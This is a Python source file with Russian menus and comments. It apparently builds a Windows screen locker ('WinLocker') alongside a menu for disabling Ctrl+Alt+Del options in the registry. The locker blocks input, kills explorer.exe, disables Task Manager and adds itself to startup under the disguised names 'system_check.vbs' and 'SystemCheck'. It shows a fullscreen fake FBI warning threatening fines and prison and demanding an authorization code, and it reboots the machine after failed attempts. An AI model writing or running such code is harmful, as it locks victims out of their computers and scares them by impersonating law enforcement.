import tkinter as tk
import ctypes
from ctypes import wintypes
import sys
import time
import random
import subprocess
import os
import winreg

# =============================================================================
# СЛУЖЕБНЫЕ ФУНКЦИИ
# =============================================================================
def is_admin():
    """Проверка прав администратора"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# =============================================================================
# ФУНКЦИИ УПРАВЛЕНИЯ CTRL+ALT+DEL
# =============================================================================
def remove_ctrl_alt_del_options():
    """Удаление опций экрана Ctrl+Alt+Del"""
    
    # Путь к ключу реестра
    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    
    try:
        # Открываем ключ реестра с правами на запись
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
    except FileNotFoundError:
        # Если ключ не существует, создаем его
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        except Exception as e:
            print(f"Ошибка создания ключа: {e}")
            return False
    except Exception as e:
        print(f"Ошибка открытия ключа: {e}")
        return False
    
    # Словарь с параметрами для удаления опций
    options = {
        "DisableTaskMgr": "Диспетчер задач",           # Удалить диспетчер задач
        "DisableLockWorkstation": "Блокировка компьютера",  # Удалить блокировку
        "DisableChangePassword": "Смена пароля",       # Удалить смену пароля
        "DisableCAD": "Ctrl+Alt+Del полностью"         # Отключить полностью
    }
    
    print("Выберите опции для удаления:")
    print("1. Удалить диспетчер задач")
    print("2. Удалить блокировку компьютера")
    print("3. Удалить смену пароля")
    print("4. Отключить Ctrl+Alt+Del полностью")
    print("5. Удалить все опции")
    print("0. Отмена")
    
    try:
        choice = int(input("\nВведите номер опции (0-5): "))
        
        if choice == 0:
            print("Отмена операции")
            return True
        elif choice == 1:
            # Удалить только диспетчер задач
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            print("✓ Диспетчер задач удален")
        elif choice == 2:
            # Удалить только блокировку компьютера
            winreg.SetValueEx(key, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
            print("✓ Блокировка компьютера удалена")
        elif choice == 3:
            # Удалить только смену пароля
            winreg.SetValueEx(key, "DisableChangePassword", 0, winreg.REG_DWORD, 1)
            print("✓ Смена пароля удалена")
        elif choice == 4:
            # Отключить полностью Ctrl+Alt+Del
            winreg.SetValueEx(key, "DisableCAD", 0, winreg.REG_DWORD, 1)
            print("✓ Ctrl+Alt+Del отключен полностью")
        elif choice == 5:
            # Удалить все опции
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "DisableChangePassword", 0, winreg.REG_DWORD, 1)
            print("✓ Все опции удалены")
        else:
            print("Неверный выбор")
            return False
            
        winreg.CloseKey(key)
        print("\nИзменения применены. Перезагрузите компьютер для вступления изменений в силу.")
        return True
        
    except ValueError:
        print("Пожалуйста, введите число")
        return False
    except Exception as e:
        print(f"Ошибка при записи в реестр: {e}")
        return False

def restore_options():
    """Восстановление опций Ctrl+Alt+Del"""
    
    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    
    print("Выберите опции для восстановления:")
    print("1. Восстановить диспетчер задач")
    print("2. Восстановить блокировку компьютера")
    print("3. Восстановить смену пароля")
    print("4. Восстановить Ctrl+Alt+Del полностью")
    print("5. Восстановить все опции")
    print("0. Отмена")
    
    try:
        choice = int(input("\nВведите номер опции (0-5): "))
        
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
        except FileNotFoundError:
            print("Ключ реестра не найден. Возможно, опции не были изменены.")
            return True
        except Exception as e:
            print(f"Ошибка открытия ключа: {e}")
            return False
        
        if choice == 0:
            print("Отмена операции")
            return True
        elif choice == 1:
            winreg.DeleteValue(key, "DisableTaskMgr")
            print("✓ Диспетчер задач восстановлен")
        elif choice == 2:
            winreg.DeleteValue(key, "DisableLockWorkstation")
            print("✓ Блокировка компьютера восстановлена")
        elif choice == 3:
            winreg.DeleteValue(key, "DisableChangePassword")
            print("✓ Смена пароля восстановлена")
        elif choice == 4:
            winreg.DeleteValue(key, "DisableCAD")
            print("✓ Ctrl+Alt+Del восстановлен")
        elif choice == 5:
            try:
                winreg.DeleteValue(key, "DisableTaskMgr")
            except FileNotFoundError:
                pass
            try:
                winreg.DeleteValue(key, "DisableLockWorkstation")
            except FileNotFoundError:
                pass
            try:
                winreg.DeleteValue(key, "DisableChangePassword")
            except FileNotFoundError:
                pass
            try:
                winreg.DeleteValue(key, "DisableCAD")
            except FileNotFoundError:
                pass
            print("✓ Все опции восстановлены")
        else:
            print("Неверный выбор")
            return False
            
        winreg.CloseKey(key)
        print("\nИзменения применены. Перезагрузите компьютер для вступления изменений в силу.")
        return True
        
    except ValueError:
        print("Пожалуйста, введите число")
        return False
    except Exception as e:
        print(f"Ошибка при удалении значений из реестра: {e}")
        return False

# =============================================================================
# OPTIMIZED WINLOCKER - FEDERAL WARNING SYSTEM
# =============================================================================
# Windows API functions with caching
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
# Pre-compiled function prototypes for better performance
BLOCK_INPUT = user32.BlockInput
GET_MODULE_HANDLE = kernel32.GetModuleHandleW
SET_HOOK = user32.SetWindowsHookExW
UNHOOK = user32.UnhookWindowsHookEx
CALL_NEXT = user32.CallNextHookEx
GET_MESSAGE = user32.GetMessageW
TRANSLATE_MSG = user32.TranslateMessage
DISPATCH_MSG = user32.DispatchMessageW

def block_input_immediately():
    """Block all input immediately - OPTIMIZED"""
    try:
        BLOCK_INPUT(True)
        return True
    except:
        return False

def unblock_input():
    """Unblock all input - OPTIMIZED"""
    try:
        BLOCK_INPUT(False)
    except:
        pass

def kill_explorer():
    """Kill explorer.exe process - OPTIMIZED"""
    try:
        subprocess.run(["taskkill", "/F", "/IM", "explorer.exe"], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                      creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        return False

def start_explorer():
    """Start explorer.exe - OPTIMIZED"""
    try:
        subprocess.Popen(["explorer.exe"], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        try:
            os.startfile("explorer.exe")
            return True
        except:
            return False

def add_to_startup():
    """Add virus to startup using two methods"""
    # Method 1: Startup folder
    startup_path = os.path.join(os.getenv('APPDATA'), 
                               'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    virus_path = sys.argv[0]
    try:
        # Create shortcut in startup folder
        with open(os.path.join(startup_path, 'system_check.vbs'), 'w') as f:
            f.write(f'Set WshShell = CreateObject("WScript.Shell")\n')
            f.write(f'WshShell.Run "{virus_path}", 0, False\n')
    except:
        pass
    # Method 2: Registry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemCheck", 0, winreg.REG_SZ, virus_path)
        winreg.CloseKey(key)
    except:
        pass

def disable_task_manager():
    """Disable Task Manager"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        # Create the key if it doesn't exist
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                  r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass

def enable_task_manager():
    """Enable Task Manager"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except:
        pass

def reboot_system():
    """Reboot the system"""
    os.system("shutdown /r /t 0")

class WinLockerApp:
    def __init__(self):
        # PERFORMANCE: Immediate blocking with error handling
        self.block_system()
        # Add to startup
        add_to_startup()
        disable_task_manager()
        # Initialize attempts
        self.attempts = 0
        self.max_attempts = 15
        # PERFORMANCE: Delay only if needed
        time.sleep(0.05)
        # Create main window with optimized settings
        self.root = tk.Tk()
        self.setup_window()
        self.setup_protection()
        self.setup_ui()
        # PERFORMANCE: Bind events efficiently
        self.root.bind("<Control-Alt-Shift-E>", self.emergency_exit)
        # PERFORMANCE: Start mainloop immediately
        self.root.mainloop()

    def block_system(self):
        """Block system immediately with multiple methods"""
        block_input_immediately()
        kill_explorer()

    def setup_window(self):
        """Setup window with optimized performance"""
        self.root.title("FBI WARNING")
        self.root.configure(bg="#000000")
        # Get dimensions once
        self.sw = self.root.winfo_screenwidth()
        self.sh = self.root.winfo_screenheight()
        # PERFORMANCE: Setup window properties
        self.root.overrideredirect(True)
        self.root.geometry(f"{self.sw}x{self.sh}+0+0")
        self.root.attributes("-topmost", True)
        self.root.focus_force()
        # PERFORMANCE: Disable window manager interactions
        self.root.attributes("-disabled", False)

    def setup_protection(self):
        """Setup protection against closing"""
        # PERFORMANCE: Multiple protection methods
        self.root.protocol("WM_DELETE_WINDOW", self.prevent_close)
        self.root.bind("<Alt-F4>", self.prevent_close)
        self.root.bind("<Control-w>", self.prevent_close)
        self.root.bind("<Control-W>", self.prevent_close)
        self.root.bind("<Escape>", self.prevent_close)
        self.root.bind("<F4>", self.prevent_close)
        self.root.bind("<Button-1>", self.prevent_mouse)
        self.root.bind("<Button-2>", self.prevent_mouse)
        self.root.bind("<Button-3>", self.prevent_mouse)

    def prevent_close(self, event=None):
        """Prevent window closing - OPTIMIZED"""
        return "break"

    def prevent_mouse(self, event=None):
        """Prevent mouse events - OPTIMIZED"""
        return "break"

    def setup_ui(self):
        """Create optimized UI"""
        # PERFORMANCE: Single canvas creation
        self.canvas = tk.Canvas(
            self.root, width=self.sw, height=self.sh,
            bg="#000000", highlightthickness=0
        )
        self.canvas.pack(fill="both", expand=True)
        # PERFORMANCE: Create UI elements efficiently
        self.create_warning_header()
        self.create_warning_content()
        self.create_password_section()
        self.create_status_bar()

    def create_warning_header(self):
        """Create warning header - OPTIMIZED"""
        # PERFORMANCE: Pre-calculated positions
        center_x = self.sw // 2
        # FBI Logo/Header
        self.canvas.create_text(
            center_x, 30,
            text="★ FEDERAL BUREAU OF INVESTIGATION ★", 
            fill="#FF0000", font=("Arial", 18, "bold")
        )
        self.canvas.create_text(
            center_x, 60,
            text="CYBER CRIME INVESTIGATION DIVISION", 
            fill="#FF5555", font=("Arial", 14, "bold")
        )
        # Red separator line
        self.canvas.create_line(
            50, 85, self.sw - 50, 85,
            fill="#FF0000", width=2
        )

    def create_warning_content(self):
        """Create warning content - OPTIMIZED"""
        center_x = self.sw // 2
        start_y = 110
        # Main warning title
        self.canvas.create_text(
            center_x, start_y,
            text="⚠ WARNING: UNAUTHORIZED ACCESS DETECTED ⚠", 
            fill="#FF0000", font=("Arial", 16, "bold")
        )
        # Warning content with optimized layout
        content = [
            "YOUR COMPUTER HAS BEEN LOCKED FOR VIOLATION OF FEDERAL LAWS",
            "",
            "VIOLATIONS DETECTED:",
            "• UNAUTHORIZED SYSTEM ACCESS",
            "• SUSPICIOUS NETWORK ACTIVITY", 
            "• SECURITY PROTOCOL VIOLATION",
            "",
            "LEGAL PENALTIES:",
            "• FINE UP TO $500,000",
            "• IMPRISONMENT UP TO 15 YEARS",
            "• PERMANENT CRIMINAL RECORD",
            "",
            "EVIDENCE COLLECTED:",
            f"• IP ADDRESS: {self.get_fake_ip()}",
            f"• LOCATION: [CLASSIFIED]",
            f"• TIMESTAMP: {time.strftime('%Y-%m-%d %H:%M:%S')}",
            "",
            "INVESTIGATING AGENCIES:",
            "• FEDERAL BUREAU OF INVESTIGATION",
            "• CYBER CRIME UNIT",
            "• INTERNET CRIME COMPLAINT CENTER",
            "",
            "TO UNLOCK YOUR SYSTEM:",
            "• ENTER AUTHORIZATION CODE BELOW",
            "• COOPERATE WITH INVESTIGATION",
            "",
            "WARNING: ATTEMPTING TO BYPASS THIS SYSTEM",
            "WILL RESULT IN IMMEDIATE LAW ENFORCEMENT RESPONSE"
        ]
        # PERFORMANCE: Efficient text rendering
        y_pos = start_y + 40
        for i, line in enumerate(content):
            if line:
                color = "#FFAAAA" if "•" in line else "#FF5555" if any(word in line for word in ["WARNING", "VIOLATIONS", "PENALTIES"]) else "#FFFFFF"
                font = ("Arial", 10 if "•" in line else 11)
                self.canvas.create_text(
                    center_x, y_pos,
                    text=line, fill=color, font=font,
                    tags=f"line_{i}"
                )
            y_pos += 18

    def get_fake_ip(self):
        """Generate fake IP for display - OPTIMIZED"""
        return f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"

    def create_password_section(self):
        """Create password section - OPTIMIZED"""
        center_x = self.sw // 2
        base_y = self.sh - 150
        # Password prompt
        self.canvas.create_text(
            center_x, base_y,
            text="ENTER AUTHORIZATION CODE:", 
            fill="#00FF00", font=("Arial", 14, "bold")
        )
        # Password entry with optimized styling
        self.password_var = tk.StringVar()
        self.password_entry = tk.Entry(
            self.root, textvariable=self.password_var,
            font=("Consolas", 18), bg="#000000", fg="#00FF00",
            insertbackground="#00FF00", width=10, justify="center",
            relief="solid", bd=2, 
            highlightthickness=1, highlightbackground="#00FF00"
        )
        self.canvas.create_window(
            center_x, base_y + 40,
            window=self.password_entry
        )
        # Submit button
        submit_btn = tk.Button(
            self.root, text="AUTHORIZE", command=self.check_password,
            font=("Arial", 12), bg="#000000", fg="#00FF00",
            activebackground="#003300", activeforeground="#00FF00",
            relief="raised", bd=2, width=12
        )
        self.canvas.create_window(
            center_x, base_y + 80,
            window=submit_btn
        )
        # Bind Enter key
        self.password_entry.bind("<Return>", lambda e: self.check_password())
        self.password_entry.focus()

    def create_status_bar(self):
        """Create status bar - OPTIMIZED"""
        # Bottom status line
        self.canvas.create_rectangle(
            0, self.sh - 25, self.sw, self.sh,
            fill="#222222", outline=""
        )
        self.canvas.create_text(
            self.sw // 2, self.sh - 12,
            text=f"FBI Case File: CLASSIFIED | Status: ACTIVE INVESTIGATION | Attempts: {self.attempts}/{self.max_attempts}",
            fill="#888888", font=("Arial", 9)
        )

    def check_password(self):
        """Verify password - OPTIMIZED"""
        password = self.password_var.get().strip()
        # Correct password is "27390"
        if password == "27390":
            self.unlock_system()
        else:
            self.wrong_password()

    def wrong_password(self):
        """Handle wrong password - OPTIMIZED"""
        self.attempts += 1
        # Update status bar
        self.canvas.delete("status_text")
        self.canvas.create_text(
            self.sw // 2, self.sh - 12,
            text=f"FBI Case File: CLASSIFIED | Status: ACTIVE INVESTIGATION | Attempts: {self.attempts}/{self.max_attempts}",
            fill="#888888", font=("Arial", 9), tags="status_text"
        )
        # Check if max attempts reached
        if self.attempts >= self.max_attempts:
            self.canvas.create_text(
                self.sw // 2, self.sh - 40,
                text="MAXIMUM ATTEMPTS EXCEEDED - SYSTEM WILL REBOOT",
                fill="#FF0000", font=("Arial", 12, "bold")
            )
            self.root.update()
            time.sleep(2)
            reboot_system()
            return
        # PERFORMANCE: Quick visual feedback WITHOUT GDI effects
        self.password_var.set("")
        self.password_entry.configure(bg="#330000")
        # Удален вызов GDI-эффектов
        self.root.update()
        time.sleep(0.2)
        self.password_entry.configure(bg="#000000")
        self.password_entry.focus()

    def unlock_system(self):
        """Unlock system - OPTIMIZED"""
        try:
            # Enable task manager
            enable_task_manager()
            # PERFORMANCE: Quick unblocking
            unblock_input()
            start_explorer()
        except:
            pass
        finally:
            # PERFORMANCE: Immediate exit
            try:
                self.root.quit()
                self.root.destroy()
            except:
                pass
            sys.exit(0)

    def emergency_exit(self, event):
        """Emergency exit - OPTIMIZED"""
        self.unlock_system()

# =============================================================================
# ГЛАВНОЕ МЕНЮ
# =============================================================================
def main():
    """Основная функция"""
    print("=== Управление системой ===")
    print()
    
    # Проверка прав администратора
    if not is_admin():
        print("Для работы скрипта требуются права администратора!")
        print("Перезапустите скрипт от имени администратора.")
        input("\nНажмите Enter для выхода...")
        return
    
    print("Выберите действие:")
    print("1. Удалить опции Ctrl+Alt+Del")
    print("2. Восстановить опции Ctrl+Alt+Del")
    print("3. Запустить WinLocker")
    print("4. Разблокировать систему (если запущен WinLocker)")
    
    try:
        action = int(input("\nВведите номер действия (1-4): "))
        
        if action == 1:
            remove_ctrl_alt_del_options()
        elif action == 2:
            restore_options()
        elif action == 3:
            print("Запуск WinLocker...")
            WinLockerApp()
        elif action == 4:
            print("Разблокировка системы...")
            try:
                enable_task_manager()
                unblock_input()
                start_explorer()
                print("Система разблокирована!")
            except Exception as e:
                print(f"Ошибка при разблокировке: {e}")
        else:
            print("Неверный выбор")
            
    except ValueError:
        print("Пожалуйста, введите число")
    except KeyboardInterrupt:
        print("\n\nОперация прервана пользователем")
    
    input("\nНажмите Enter для выхода...")

if __name__ == "__main__":
    main()